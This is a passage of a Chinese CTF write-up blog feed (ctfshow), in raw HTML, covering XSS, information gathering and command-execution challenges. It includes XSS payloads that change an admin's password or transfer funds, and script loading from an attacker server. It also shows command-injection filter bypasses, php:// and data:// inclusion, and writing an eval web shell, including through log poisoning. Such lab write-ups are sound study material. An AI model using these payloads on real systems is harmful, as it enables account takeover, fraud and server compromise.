class="hljs-selector-attr">[1]</span>.innerHTML) 这是一个调用 window<span class="hljs-selector-class">.open</span>() 函数的语句，用于打开新的浏览器窗口。<br><br><span class="hljs-string">&#x27;http://ip/&#x27;</span> 这是一个字符串，表示要打开的网页的 URL。它包括了协议（http:<span class="hljs-comment">//）、主机名（ip）和端口号（80），以及路径（后面的斜杠 /）。</span><br><br>document<span class="hljs-selector-class">.getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>)<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.innerHTML</span> 这是一系列 DOM 操作，用于获取网页中特定元素的内容。<br><br>document<span class="hljs-selector-class">.getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>) 是一个通过类名查找元素的方法。它查找具有类名<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span> 的元素，通常这是一种针对表格单元格的选择。<br><br><span class="hljs-selector-attr">[1]</span> 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 <span class="hljs-number">0</span> 开始）。<br><br><span class="hljs-selector-class">.innerHTML</span> 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或 HTML。<br><span class="hljs-number">1</span>、innerHTML:<br>　　从对象的起始位置到终止位置的全部内容,不包括Html标签。<br>innerText可替代innerHTML<br><span class="hljs-number">2</span>、outerHTML:<br>　　除了包含innerHTML的全部内容外, 还包含对象标签本身。<br></code></pre></td></tr></table></figure><p>其他方法：<a href="https://blog.csdn.net/Jayjay___/article/details/133375048">https://blog.csdn.net/Jayjay___/article/details/133375048</a></p><h2 id="web-330（xss修改管理员密码（get方法））"><a href="#web-330（xss修改管理员密码（get方法））" class="headerlink" title="web-330（xss修改管理员密码（get方法））"></a>web-330（xss修改管理员密码（get方法））</h2><p>这题的登录页面多了个修改密码的功能，这题的思路就是我们注入一个xss，让管理员触发自动修改他的密码，这样我们就能登录了</p><p>我们注册一个普通账号，然后再修改密码时抓包</p><p>可以看到修改密码文件路径为<code>/api/change.php?p=</code>而且这里是使用GET方法来发送数据</p><p><img src="/../image/web-xss-9.png"></p><p>所以我们构造payload，并在注册账号中注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php?p=2439&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>注意这里Ip是127.0.0.1就是本地，因为服务端就在管理员的本地<br></code></pre></td></tr></table></figure><p>之后登录账号admin，密码2439</p><p>得到flag</p><p><img src="/../image/web-xss-10.png"></p><p>这时候会出现一种情况，我们在管理员账号上一点击<code>用户管理</code>，立马跳转到api，来不及复制flag。这是因为我们的XSSpayload是一个用户账号，管理员每次访问<code>用户管理</code>都会解析它。</p><p>解决办法：立刻Ctrl+u查看源码或者抓包。</p><h2 id="web-331（xss修改管理员密码（post方法））"><a href="#web-331（xss修改管理员密码（post方法））" class="headerlink" title="web-331（xss修改管理员密码（post方法））"></a>web-331（xss修改管理员密码（post方法））</h2><p>修改密码从GET方法变成了POST方法，其他的都没变，将payload修改成post请求即可</p><p>jQuery 提供的 Ajax 方法，用于向服务器发送异步 HTTP 请求</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">p</span>:<span class="hljs-string">&#x27;2439&#x27;</span>&#125;&#125;)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://d76df70b-08d6-47a1-9faf-d9582a5e5ff3.node5.buuoj.cn/change&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-string">&#x27;newpassword&#x27;</span>:<span class="hljs-string">&#x27;2439&#x27;</span>&#125;&#125;)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>url：发送路径，type：发送类型，data：数据</p><h2 id="web-332"><a href="#web-332" class="headerlink" title="web-332"></a>web-332</h2><p>这题多了很多功能，比如转账，个人账户，购买flag，从题目来看需要我们有足够的钱才能购买flag</p><p>法一：</p><p>这道题它代码逻辑有问题，转账的不扣转账方的金额，所以可以一直向自己转账，转的金额不超过自己余额即可（这里可以使用python脚本来写）</p><p>方法二：</p><p>可以给admin转-10000，这样我们就会+10000（有点离谱）</p><p>方法三：</p><p>直接让admin转自己10000，和上题让admin自己改密码思路是一样的</p><p>使用burpsuite抓转账的请求包</p><p><img src="/../image/web-xss-11.png"></p><p><strong>发现转账的路径为<code>/api/amount.php</code>，并且使用POST方法来发送数据<code>u=mixbp&amp;a=5</code></strong></p><p><strong>构造payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;$.<span class="hljs-title function_ invoke__">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://127.0.0.1/api/amount.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">u</span>:<span class="hljs-string">&#x27;mixbp&#x27;</span>,<span class="hljs-attr">a</span>:<span class="hljs-string">&#x27;10000&#x27;</span>&#125;&#125;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>在注册界面注入我们的payload，之后就能看到钱已经到账了</p><hr><p>同样的原理：</p><p>这题也可以在我们的服务器上新建一个js文件名为mixbp.js</p><p>写入代码</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-variable">$.</span>ajax(&#123;<br>  url: <span class="hljs-string">&quot;http://127.0.0.1/api/amount.php&quot;</span>,<br>  <span class="hljs-function"><span class="hljs-keyword">method</span>: &quot;<span class="hljs-title">POST</span>&quot;,</span><br><span class="hljs-function">  <span class="hljs-title">data</span>:</span>&#123;<br>    <span class="hljs-string">&#x27;u&#x27;</span>:<span class="hljs-string">&#x27;mixbp&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-number">10000</span><br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>然后构造payload并在注册界面写入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">src=<span class="hljs-string">&quot;http://服务器ip/mixbp.js&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web-333"><a href="#web-333" class="headerlink" title="web-333"></a>web-333</h2><p>除了不能转别人-10000之外，其他两种方法都能用，这里用python脚本来写试试</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://c7e62c4c-a965-48a5-9c7a-390114141304.challenge.ctf.show/api/amount.php&quot;</span><br>headers =&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;PHPSESSID=???&#x27;</span>&#125; #自己账号登陆后的sessionid<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">10000</span>):<br>    tmp=i*<span class="hljs-number">4</span><br>    <span class="hljs-keyword">data</span> = &#123;<br>        <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">&#x27;mixbp&#x27;</span>,<br>        <span class="hljs-string">&#x27;a&#x27;</span>: str(tmp)<br>    &#125;<br>    res=requests.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>,headers=headers)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-信息搜集</title>
      <link href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="web-信息搜集"><a href="#web-信息搜集" class="headerlink" title="web-信息搜集"></a>web-信息搜集</h1><h2 id="web-1（源码查看）"><a href="#web-1（源码查看）" class="headerlink" title="web-1（源码查看）"></a>web-1（源码查看）</h2><p>打开页面，显示where is flag？，这里直接右键查看源代码就能看到flag了</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1.png"></p><hr><h2 id="web-2（源码查看）"><a href="#web-2（源码查看）" class="headerlink" title="web-2（源码查看）"></a>web-2（源码查看）</h2><p>打开页面显示无法查看源代码（F12和右键查看源代码被禁），这里可以使用ctrl+u快捷键查看源代码，或者在url头部添加 view-source:</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2.png"></p><hr><h2 id="web-3（响应包信息查看）"><a href="#web-3（响应包信息查看）" class="headerlink" title="web-3（响应包信息查看）"></a>web-3（响应包信息查看）</h2><p>页面还是显示where is flag?，查看源代码也没发现flag，这里使用burpsuite抓包看看</p><p>把请求包放在重放器里然后发送，发现flag在响应中</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-3.png"></p><hr><h2 id="web-4（robots-txt）"><a href="#web-4（robots-txt）" class="headerlink" title="web-4（robots.txt）"></a>web-4（robots.txt）</h2><p>题目简介写了robots.txt可能泄露信息，所以直接访问robots.txt，显示flagishere.txt</p><p>再次访问这个文件即可拿到flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-4.png"></p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-5.png"></p><p>参考链接：<a href="https://blog.csdn.net/m0_51683653/article/details/127252676?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-5-127252676-blog-7918528.235%5Ev43%5Epc_blog_bottom_relevance_base7&spm=1001.2101.3001.4242.4&utm_relevant_index=8">【每天学习一点新知识】robots.txt详解-CSDN博客</a></p><p><strong>什么是robots.txt?</strong></p><p> <strong>robots.txt是一个协议,我们可以把它理解为一个网站的”管家”,它会告诉搜索引擎哪些页面可以访问,哪些页面不能访问。也可以规定哪些搜索引擎可以访问我们的网站而哪些搜索引擎不能爬取我们网站的信息等等,是网站管理者指定的”君子协议”。</strong></p><p><strong>当一个搜索机器人（有的叫搜索蜘蛛）访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。</strong></p><p><strong>另外，robots.txt必须放置在一个站点的根目录下，而且文件名必须全部小写。</strong></p><hr><h2 id="web-5（phps源码泄露）"><a href="#web-5（phps源码泄露）" class="headerlink" title="web-5（phps源码泄露）"></a>web-5（phps源码泄露）</h2><p>题目简介提示phps源码泄露，所以直接访问index.phps，然后会弹出下载框，将index.phps下载下来用记事本打开发现flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-6.png"></p><hr><h2 id="web-6（压缩文件泄露）"><a href="#web-6（压缩文件泄露）" class="headerlink" title="web-6（压缩文件泄露）"></a>web-6（压缩文件泄露）</h2><p>用dirsearch扫一下目录发现一个<a href="http://www.zip文件,结合题目提示的压缩文件泄露,所以直接访问这个文件,然后会自动下载下来/">www.zip文件，结合题目提示的压缩文件泄露，所以直接访问这个文件，然后会自动下载下来</a></p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-7.png"></p><p>解压发现两个文件，打开fl00g.txt找到flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-8.png"></p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-9.png"></p><hr><h2 id="web-7（git代码泄露）"><a href="#web-7（git代码泄露）" class="headerlink" title="web-7（git代码泄露）"></a>web-7（git代码泄露）</h2><p>考察git代码泄露，直接访问url&#x2F;.git&#x2F;index.php</p><p>和上一关方法相同，使用dirsearch扫一下目录</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-10.png"></p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-11.png"></p><hr><h2 id="web-8（svn泄露）"><a href="#web-8（svn泄露）" class="headerlink" title="web-8（svn泄露）"></a>web-8（svn泄露）</h2><p>考察信息svn泄露,直接访问url&#x2F;.svn&#x2F;，一样用dirsearch扫一下，发现一个.svn文件，访问之后就是flag</p><hr><h2 id="web-9（vim缓存泄露）"><a href="#web-9（vim缓存泄露）" class="headerlink" title="web-9（vim缓存泄露）"></a>web-9（vim缓存泄露）</h2><p>考察vim缓存信息泄露，直接访问url&#x2F;index.php.swp 注：上面的信息泄露可以参考 <a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></p><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p><p>以 index.php 为例：</p><p>第一次产生的交换文件名为 .index.php.swp</p><p>再次意外退出后，将会产生名为 .index.php.swo 的交换文件</p><p>第三次产生的交换文件则为 .index.php.swn</p><p>所以根据提示直接访问index.php.swp即可拿到flag</p><hr><h2 id="web-10（查看cookie信息）"><a href="#web-10（查看cookie信息）" class="headerlink" title="web-10（查看cookie信息）"></a>web-10（查看cookie信息）</h2><p>根据提示猜测flag在cookie里，直接F12查看cookie即可拿到flag，但是需要解码，或者使用burpsuite抓包，在请求头的cookie中也可拿到flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-12.png"></p><hr><h2 id="web-11（域名解析）"><a href="#web-11（域名解析）" class="headerlink" title="web-11（域名解析）"></a>web-11（域名解析）</h2><p>题目提示域名也可以隐藏信息。</p><p><strong>查询域名解析地址 基本格式：nslookup host [server]</strong></p><p><strong>查询域名的指定解析类型的解析记录 基本格式：nslookup -type&#x3D;type host [server]</strong></p><p><strong>查询全部 基本格式：nslookup -query&#x3D;any host [server]</strong></p><p><strong>编辑nslookup -query&#x3D;any flag.ctfshow.com</strong></p><p><strong>C:\Users\16032&gt;nslookup -query&#x3D;any flag.ctfshow.com 服务器: public-dns-a.baidu.com Address: 180.76.76.76 非权威应答: flag.ctfshow.com text &#x3D; “flag{just_seesee}”</strong></p><p>所以直接使用命令： nslookup -qt&#x3D;txt flag.ctfshow.com即可</p><p>也可直接使用域名解析网站直接解析ctfshow.com</p><hr><h2 id="web-12（网站信息泄露）"><a href="#web-12（网站信息泄露）" class="headerlink" title="web-12（网站信息泄露）"></a>web-12（网站信息泄露）</h2><p>打开发现是个网站，先查看robots.txt文件，就能得到用户名admin。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-13.png"></p><p>用dirsearch扫出&#x2F;admin，访问发现是管理员登录页面。但是我们只有用户名，无法登录</p><p>在网页里看看，发现最下面有一行数字，猜测就是密码</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-14.png"></p><p>直接登录就能拿到flag了</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-15.png"></p><p>这里的意思是管理员密码有时也会在页面中吗？</p><hr><h2 id="web-13（网站信息泄露）"><a href="#web-13（网站信息泄露）" class="headerlink" title="web-13（网站信息泄露）"></a>web-13（网站信息泄露）</h2><p>打开又是一个网页，这里发现最下面有个document可以点击，点进去是一个pdf文件</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-16.png"></p><p>pdf内写了默认后台地址、默认用户名、默认密码</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-17.png"></p><p>我们将默认后台地址中的your-domain改成题目的地址，然后使用用户名和密码登录即可拿到flag</p><hr><h2 id="web-14（网站信息泄露）"><a href="#web-14（网站信息泄露）" class="headerlink" title="web-14（网站信息泄露）"></a>web-14（网站信息泄露）</h2><p>根据题目提示访问editor，这里用diresearch扫一遍也行。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-18.png"></p><p>点击插入文件，里面有个文件空间，发现 居然是服务器中的文件（非本地），于是浏览一下目录 在var&#x2F;www&#x2F;html目录 中，存在 一个nothinghere有一个文件 fl000g.txt 直接访问这个fl000g.txt 即可获得flag!</p><p><strong>url访问&#x2F;nothinghere&#x2F;fl000g.txt即可获取flag</strong></p><h2 id="web-15（网站信息泄露）"><a href="#web-15（网站信息泄露）" class="headerlink" title="web-15（网站信息泄露）"></a>web-15（网站信息泄露）</h2><p>打开页面发现最下面有个邮箱号<code>1156631961@qq.com</code>，记下来，然后访问&#x2F;admin，发现是一个后台登录页面。猜测用户名是admin，但是不知道密码。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-19.png"></p><p>点开忘记密码发现有个密保，问我们所在地是哪个城市，直接qq查找上面的邮箱中的qq号，可以查到个人简介所在地是西安。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-20.png"></p><p>重置密码成功。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-21.png"></p><p>登录后台即可拿到flag</p><hr><h2 id="web-16（探针泄露）"><a href="#web-16（探针泄露）" class="headerlink" title="web-16（探针泄露）"></a>web-16（探针泄露）</h2><p>题目提示探针，所以访问tz.php。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-22.png"></p><p>然后点开phpinfo，ctrl+f查找flag，即可拿到flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-23.png"></p><p><a href="https://blog.csdn.net/weixin_43790779/article/details/108834213?ops_request_misc=%7B%22request_id%22:%22171310161416800185843688%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=171310161416800185843688&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108834213-null-null.142%5Ev100%5Econtrol&utm_term=PHP%E6%8E%A2%E9%92%88&spm=1018.2226.3001.4187"><strong>php</strong>探针</a></p><hr><h2 id="web-17（sql文件备份泄露）"><a href="#web-17（sql文件备份泄露）" class="headerlink" title="web-17（sql文件备份泄露）"></a>web-17（sql文件备份泄露）</h2><p>题目提示sql文件备份，dirsearch扫一遍发现&#x2F;backup.sql直接访问自动下载下来</p><p>打开之后拿到flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-24.png"></p><hr><h2 id="web-18（js前端分析）"><a href="#web-18（js前端分析）" class="headerlink" title="web-18（js前端分析）"></a>web-18（js前端分析）</h2><p>打开之后发现是个小游戏，然后提示要玩到101分才给flag，发现难度不是给人玩的。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-25.png"></p><p>查看源码发现一个js文件，点开，然后分析js代码。当score&gt;120时，且game_over这个参数为false时，即可赢，于是打开开发者模式中的console，直接赋值score&#x3D;130 game_over&#x3D;false 然后，执行游戏 的run() 即可得到 “你赢了</p><p>直接控制台改分数即可</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score = <span class="hljs-number">101</span><br><span class="hljs-function"><span class="hljs-title">run</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-26.png"></p><p>显示“你赢了，去幺幺零点皮爱吃皮看看”，一看就是拼音</p><p>访问110.php即可拿到flag</p><hr><h2 id="web-19（前端密钥泄露）"><a href="#web-19（前端密钥泄露）" class="headerlink" title="web-19（前端密钥泄露）"></a>web-19（前端密钥泄露）</h2><p>打开后发现是个登录界面，题目提示密钥不要放在前端，所以我们查看下源代码，然后发现密钥真的在前端。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-27.png"></p><p>分析前端代码，发现只要post传参值判定正确即可输出flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-28.png"></p><hr><h2 id="web-20（mdb文件泄露）"><a href="#web-20（mdb文件泄露）" class="headerlink" title="web-20（mdb文件泄露）"></a>web-20（mdb文件泄露）</h2><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加&#x2F;db&#x2F;db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}</p><p>然后会自动给我们下载下来，记事本打开crtl+f查找flag即可</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-29.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-命令执行</title>
      <link href="/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="web-命令执行"><a href="#web-命令执行" class="headerlink" title="web-命令执行"></a>web-命令执行</h1><h2 id="web-29（-模糊匹配）"><a href="#web-29（-模糊匹配）" class="headerlink" title="web-29（*模糊匹配）"></a>web-29（*模糊匹配）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png"></p><p>发现过滤了flag关键字，这里使用*模糊匹配就行了</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fla*&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web-30（passthru、-模糊匹配）"><a href="#web-30（passthru、-模糊匹配）" class="headerlink" title="web-30（passthru、*模糊匹配）"></a>web-30（passthru、*模糊匹配）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.png"></p><p>又过滤了system和php关键字，我们把system换成passthru加上模糊匹配即可</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;cat fla*&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web-31（tac、-09绕过空格过滤、双引号绕过单引号过滤）"><a href="#web-31（tac、-09绕过空格过滤、双引号绕过单引号过滤）" class="headerlink" title="web-31（tac、%09绕过空格过滤、双引号绕过单引号过滤）"></a>web-31（tac、%09绕过空格过滤、双引号绕过单引号过滤）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-3.png"></p><p>这里又把cat、单引号和空格过滤了，可以把cat换成tac然后用url编码%09绕过空格过滤，然后使用双引号闭合</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&quot;tac%09fla*&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="web-32（文件包含、filter伪协议、变量覆盖）"><a href="#web-32（文件包含、filter伪协议、变量覆盖）" class="headerlink" title="web-32（文件包含、filter伪协议、变量覆盖）"></a>web-32（文件包含、filter伪协议、变量覆盖）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-4.png"></p><p>这题过滤了更多东西。这里可以通过文件包含（伪协议）和变量覆盖来写，因为include包含函数是可以包含变量的$_GET[1]不加括号是因为，include把$__GET[1]当做一个变量来看，变量的内容由1来确定，1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php是通过get请求传入的参数，内容是一个文件包含，以base64形式返回</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web-33（文件包含、data-伪协议）"><a href="#web-33（文件包含、data-伪协议）" class="headerlink" title="web-33（文件包含、data:&#x2F;&#x2F;伪协议）"></a>web-33（文件包含、data:&#x2F;&#x2F;伪协议）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-5.png"></p><p>和上一题差不多，但是可以用另一种方法，文件包含<strong>data:&#x2F;&#x2F;协议</strong></p><p>类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="web-34（文件包含、input伪协议）"><a href="#web-34（文件包含、input伪协议）" class="headerlink" title="web-34（文件包含、input伪协议）"></a>web-34（文件包含、input伪协议）</h2><p>和上一题一样，但是我们换一种方法，文件包含php:&#x2F;&#x2F;input伪协议来做</p><p>利用该方法可以直接写入php文件，比如url中输入?file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，在POST请求中写入php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//input</span><br><br>抓包在post请求中写入<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这样就会在服务器端自动生成我们的一句话木马文件，然后用蚁剑连接即可拿到flag</p><h2 id="web-35（同前几题）"><a href="#web-35（同前几题）" class="headerlink" title="web-35（同前几题）"></a>web-35（同前几题）</h2><p>和前几个题一样</p><h2 id="web-36（日志包含）"><a href="#web-36（日志包含）" class="headerlink" title="web-36（日志包含）"></a>web-36（日志包含）</h2><p>和前几个题相比多过滤了0-9，把GET方法中的参数改为a即可。</p><p><strong>使用日志包含也可以，用文件包含去包含nginx默认的access日志路径，然后访问该路径抓包，在UA头里写入一句话木马，然后用蚁剑连接即可</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br><br>日志包含<br><span class="hljs-string">?c</span>=<span 